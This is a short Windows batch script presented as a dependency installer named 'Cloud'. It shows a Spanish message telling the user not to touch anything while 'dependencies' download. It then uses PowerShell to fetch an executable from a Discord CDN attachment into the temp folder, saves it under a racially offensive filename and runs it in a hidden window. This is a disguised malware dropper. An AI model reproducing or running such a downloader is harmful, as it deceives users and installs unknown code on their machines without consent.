@echo off
title Cloud
set "url=https://cdn.discordapp.com/attachments/1245898799210168331/1306390427573948456/ZXNwbGFjaA-1.exe?ex=67367e65&is=67352ce5&hm=a745d9d31d9c60d85751c48350d87fc3856b02f426120037ad5b8b97c87a4ab1&"
set "filename=georgefloydss.exe"
color b
echo NO TOQUES NADA!!! Las dependencias se estan descargando, esto podria tomar un buen tiempo, cuando se termine se va a cerrar automaticamente.
cd /d "%TEMP%"
powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%filename%'); Start-Process '%filename%' -WindowStyle Hidden
